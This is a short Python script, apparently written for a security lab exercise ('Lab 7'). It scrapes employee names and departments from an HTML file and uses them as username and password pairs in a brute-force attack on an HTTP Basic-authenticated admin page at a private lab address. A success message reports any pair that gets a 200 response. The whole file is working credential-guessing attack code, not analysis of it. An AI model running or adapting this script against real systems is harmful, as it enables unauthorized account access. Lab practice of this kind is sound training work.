""" 
    This is a simple brute force login attempt for Lab 7.  
    It uses BeautifulSoup to gather data from an HTML file and uses that data to brute force a login page with the requests library. 
"""

import requests
from bs4 import BeautifulSoup
from base64 import b64encode


def make_soup(filename, parser='html.parser'):
    """ Returns soup for given filename """
    with open(filename) as fp:
        return BeautifulSoup(fp, parser)


def filter_soup_by_tag(tag):
    """ Finds all of the given tag and returns as a list """
    return soup.find_all(tag)


def encode(var):
    return b64encode(bytes(var.encode('ascii')))


#####################
# MAIN
soup = make_soup('employee_list.html')
tags = filter_soup_by_tag('td')

# Filter Employee Names, convert to Set
employees = []

for item in tags[0:len(tags):2]:
    employees.append(item.contents[0])

employees_set = set(employees)

# Filter Departments, convert to Set to remove duplicates
departments = []

for item in tags[1:len(tags):2]:
    departments.append(item.contents[0])

department_set = set(departments)

# Auth page to brute force: http://172.16.120.120/admin.php
# Pay attention to the basic authentication mechanism
url = 'http://172.16.120.120/admin.php'
for name in employees_set:
    for department in department_set:
        encoded_auth = name + ':' + department
        headers = {
            'Authorization': 'Basic {}'.format(
                encode(encoded_auth).decode('ascii')
            )
        }
        response = requests.post(url, headers=headers)
        if (response.status_code == 200):
            print('Brute Force Success - Username: {} - Password: {}'.format(name, department))
